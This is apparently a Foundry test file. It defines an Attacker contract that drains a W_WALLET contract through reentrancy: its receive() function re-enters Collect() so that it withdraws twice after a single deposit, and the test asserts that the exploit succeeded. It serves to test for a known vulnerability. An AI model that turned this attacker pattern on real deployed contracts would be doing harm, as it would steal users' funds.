
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET, Log} from "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {
    W_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new W_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is at least MinSum (1 ether) and within safe bounds
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have deposited funds first via Put()
        // Time needs to pass the unlockTime

        // --- 3. Funding ---
        // Fund the victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Setup: Attacker deposits funds into the wallet
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to pass the unlock time
        vm.warp(block.timestamp + 1);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = W_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into the victim contract to satisfy balance requirements
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        
        // 3. Call the vulnerable function
        attackCallCount = 1;
        victim.Collect(val);
        
        // 4. Verify Success Conditions
        // If we received more than we should have (due to reentrancy), the attack succeeded
        // The attacker should have received val * 2 (initial call + reentrant call)
        // while only having deposited val
        if (attackCallCount >= 2 && address(this).balance >= storedAttackVal * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2 && address(victim).balance >= storedAttackVal) {
            attackCallCount++;
            // Re-enter the vulnerable Collect function
            victim.Collect(storedAttackVal);
        }
    }
}
